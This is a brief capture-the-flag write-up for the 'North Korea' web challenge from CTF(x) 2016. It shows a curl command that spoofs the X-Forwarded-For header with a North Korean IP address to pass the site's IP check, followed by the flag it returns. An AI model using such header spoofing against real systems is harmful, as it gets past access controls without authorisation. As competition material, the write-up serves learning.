---
title: "CTF(x) 2016 - North Korea (Web)"
header:
  overlay_image: /assets/images/ctfx2016/northkorea/header.jpg
  overlay_filter: 0.5
tags:
  - ctfx2016
  - writeup
  - web
---

Fake an originating IP address from North Korea using the `X-Forwarded-For`
header.

## Solution

Pretty easy challenge. We need to fake our originating IP address to the site
using the `X-Forwarded-For` header. Obviously, we should use an IP address
within the North Korean range.

```shell
amon@Evanna:~/ctf/ctfx/web/northkorea$ curl 'http://problems.ctfx.io:7002/code'  \
-H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'Accept-Languq=0.8,en-GB;q=0.6' \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36' \
-H 'Accept: */*' -H 'Referer: http://problems.ctfx.io:7002/' \
-H 'X-Requested-With: XMLHttpRequest' \
-H 'Connection: keep-alive' --compressed -H 'X-Forwarded-For: 175.45.177.0'
ctf(jk_we_aint_got_n0_nuk35)
```

Flag: **ctf(jk\_we\_aint\_got\_n0\_nuk35)**
